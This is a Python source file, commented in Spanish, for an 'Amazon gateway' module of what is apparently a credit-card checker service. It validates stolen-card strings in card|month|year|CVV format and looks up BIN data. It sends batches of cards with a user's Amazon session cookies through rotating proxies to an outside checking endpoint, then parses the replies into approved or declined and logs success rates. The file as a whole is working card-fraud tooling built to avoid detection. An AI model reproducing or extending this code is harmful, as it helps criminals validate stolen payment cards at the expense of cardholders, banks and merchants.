import time
import re
import requests
import json
import asyncio
import aiohttp
from typing import Dict, List, Optional, Tuple
from sqlalchemy.orm import Session
from ...models import UserCookie, CardCheck
from ...schemas import AmazonCardResult
from ...proxy_manager import ProxyManager

class AmazonGateway:
    def __init__(self, db: Session):
        self.db = db
        self.gateway_type = "amazon"
        self.api_url = "https://emiratchk-chk.cloud/amazon/Amazon.php"
        self.proxy_manager = ProxyManager(db)
    
    async def save_cookie(self, user_id: int, cookie: str) -> Tuple[bool, str]:
        """Guardar la cookie de Amazon de un usuario"""
        try:
            # Verificar si ya existe una cookie para este usuario y gateway
            existing_cookie = self.db.query(UserCookie).filter(
                UserCookie.user_id == user_id,
                UserCookie.gateway_type == self.gateway_type
            ).first()
            
            if existing_cookie:
                # Actualizar cookie existente
                existing_cookie.cookie_data = cookie
                existing_cookie.is_active = True
            else:
                # Crear nueva cookie
                new_cookie = UserCookie(
                    user_id=user_id,
                    gateway_type=self.gateway_type,
                    cookie_data=cookie
                )
                self.db.add(new_cookie)
            
            self.db.commit()
            return True, "Cookie guardada correctamente"
        except Exception as e:
            self.db.rollback()
            return False, f"Error al guardar la cookie: {str(e)}"
    
    def get_cookie(self, user_id: int) -> Optional[str]:
        """Obtener la cookie de Amazon de un usuario"""
        try:
            cookie_data = self.db.query(UserCookie).filter(
                UserCookie.user_id == user_id,
                UserCookie.gateway_type == self.gateway_type,
                UserCookie.is_active == True
            ).first()
            
            return cookie_data.cookie_data if cookie_data else None
        except Exception as e:
            return None
    
    def validate_card_format(self, card_data: str) -> bool:
        """Validar formato de tarjeta: cc|mm|yyyy|cvv"""
        pattern = r"^\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}$"
        return bool(re.match(pattern, card_data))
    
    async def get_bin_info(self, card_number: str) -> Dict:
        """Obtener información del BIN de la tarjeta"""
        try:
            bin_number = card_number[:6]
            response = await asyncio.to_thread(
                requests.get, 
                f'https://binlist.io/lookup/{bin_number}',
                timeout=10
            )
            
            if response.status_code == 200:
                return response.json()
            else:
                return {
                    "scheme": "Unknown",
                    "type": "Unknown", 
                    "category": "Unknown",
                    "country": {"name": "Unknown", "emoji": "🌍"},
                    "bank": {"name": "Unknown"}
                }
        except Exception as e:
            return {
                "scheme": "Unknown",
                "type": "Unknown",
                "category": "Unknown", 
                "country": {"name": "Unknown", "emoji": "🌍"},
                "bank": {"name": "Unknown"}
            }
    
    async def check_card(self, user_id: int, card_data: str) -> AmazonCardResult:
        """Verificar una tarjeta en Amazon"""
        start_time = time.time()
        
        try:
            # Validar formato de tarjeta
            if not self.validate_card_format(card_data):
                return AmazonCardResult(
                    card_number=card_data,
                    status="error",
                    response_message="Formato de tarjeta inválido",
                    bin_info={},
                    processing_time=time.time() - start_time
                )
            
            # Obtener cookie del usuario
            cookie = self.get_cookie(user_id)
            if not cookie:
                return AmazonCardResult(
                    card_number=card_data,
                    status="error",
                    response_message="No hay cookie configurada para Amazon",
                    bin_info={},
                    processing_time=time.time() - start_time
                )
            
            # Obtener información del BIN
            bin_info = await self.get_bin_info(card_data.split('|')[0])
            
            # Preparar payload para la API
            payload = {
                'lista': card_data.strip(),
                'cookies': cookie.strip()
            }
            
            # Obtener proxy para la petición
            proxy_config = self.proxy_manager.get_proxy_for_request()
            
            # Hacer petición a la API de Amazon
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    self.api_url,
                    data=payload,
                    proxy=proxy_config['proxy'] if proxy_config else None,
                    timeout=180
                ) as response:
                    response_text = await response.text()
            
            # Parsear respuesta
            status, response_message = self._parse_response(response_text)
            
            # Calcular tiempo de procesamiento
            processing_time = time.time() - start_time
            
            # Crear resultado
            result = AmazonCardResult(
                card_number=card_data,
                status=status,
                response_message=response_message,
                bin_info=bin_info,
                processing_time=processing_time
            )
            
            # Actualizar estadísticas del proxy si se usó uno
            if proxy_config:
                self.proxy_manager.update_proxy_stats(
                    proxy_config['proxy_id'], 
                    status in ['approved', 'declined']  # Considerar éxito si no es error
                )
            
            # Guardar en base de datos
            self._save_card_check(user_id, result, proxy_config)
            
            return result
            
        except Exception as e:
            return AmazonCardResult(
                card_number=card_data,
                status="error",
                response_message=f"Error al procesar tarjeta: {str(e)}",
                bin_info={},
                processing_time=time.time() - start_time
            )
    
    def _parse_response(self, response_text: str) -> Tuple[str, str]:
        """Parsear la respuesta de la API de Amazon"""
        try:
            # Buscar status
            status_match = re.search(r'<span class="text-(success|danger)">(Aprovada|Reprovada|Erros)</span>', response_text)
            message_match = re.search(r'<span class="text-(success|danger)">(.+?)</span>\s*➔\s*Tempo de resposta', response_text, re.DOTALL)
            
            status = "error"
            response_message = "Error al procesar la respuesta de la API"
            
            if message_match:
                response_msg_raw = message_match.group(2).strip()
                
                if "Erro ao obter acesso passkey" in response_msg_raw:
                    status = "invalid_cookies"
                    response_message = "Close and login to your account again"
                elif "Cookies não detectado" in response_msg_raw:
                    status = "invalid_cookies"
                    response_message = "Invalid cookie, please change"
                elif "Um endereço foi cadatrado" in response_msg_raw:
                    status = "address_required"
                    response_message = "Add address to account"
                elif "Erro interno - Amazon API" in response_msg_raw:
                    status = "api_error"
                    response_message = "Internal API Error"
                elif "Lista inválida" in response_msg_raw:
                    status = "invalid_format"
                    response_message = "Invalid card format"
                else:
                    if status_match:
                        status_raw = status_match.group(2)
                        if status_raw == "Aprovada":
                            status = "approved"
                            response_message = "Approved Card! ✅"
                        elif status_raw == "Reprovada":
                            status = "declined"
                            response_message = "Declined Card! ❌"
            
            return status, response_message
            
        except Exception as e:
            return "error", f"Error al parsear respuesta: {str(e)}"
    
    def _save_card_check(self, user_id: int, result: AmazonCardResult, proxy_config: Optional[Dict] = None):
        """Guardar el resultado de la verificación en la base de datos"""
        try:
            card_check = CardCheck(
                user_id=user_id,
                gateway_type=self.gateway_type,
                card_number=result.card_number,
                card_data=json.dumps({
                    "card_number": result.card_number,
                    "status": result.status,
                    "response_message": result.response_message
                }),
                status=result.status,
                response_message=result.response_message,
                bin_info=json.dumps(result.bin_info),
                processing_time=result.processing_time,
                proxy_used=proxy_config['proxy_string'] if proxy_config else None
            )
            
            self.db.add(card_check)
            self.db.commit()
            
        except Exception as e:
            self.db.rollback()
            print(f"Error al guardar verificación de tarjeta: {str(e)}")
    
    async def check_multiple_cards(self, user_id: int, cards: List[str]) -> List[AmazonCardResult]:
        """Verificar múltiples tarjetas"""
        results = []
        
        for card in cards[:15]:  # Máximo 15 tarjetas
            result = await self.check_card(user_id, card)
            results.append(result)
            
            # Pequeña pausa entre verificaciones
            await asyncio.sleep(1)
        
        return results
    
    def get_user_card_history(self, user_id: int, limit: int = 50) -> List[CardCheck]:
        """Obtener historial de verificaciones de tarjetas del usuario"""
        return self.db.query(CardCheck).filter(
            CardCheck.user_id == user_id,
            CardCheck.gateway_type == self.gateway_type
        ).order_by(CardCheck.created_at.desc()).limit(limit).all()
    
    def get_user_stats(self, user_id: int) -> Dict:
        """Obtener estadísticas del usuario para Amazon"""
        total_checks = self.db.query(CardCheck).filter(
            CardCheck.user_id == user_id,
            CardCheck.gateway_type == self.gateway_type
        ).count()
        
        approved_checks = self.db.query(CardCheck).filter(
            CardCheck.user_id == user_id,
            CardCheck.gateway_type == self.gateway_type,
            CardCheck.status == "approved"
        ).count()
        
        declined_checks = self.db.query(CardCheck).filter(
            CardCheck.user_id == user_id,
            CardCheck.gateway_type == self.gateway_type,
            CardCheck.status == "declined"
        ).count()
        
        return {
            "total_checks": total_checks,
            "approved": approved_checks,
            "declined": declined_checks,
            "success_rate": (approved_checks / total_checks * 100) if total_checks > 0 else 0
        }
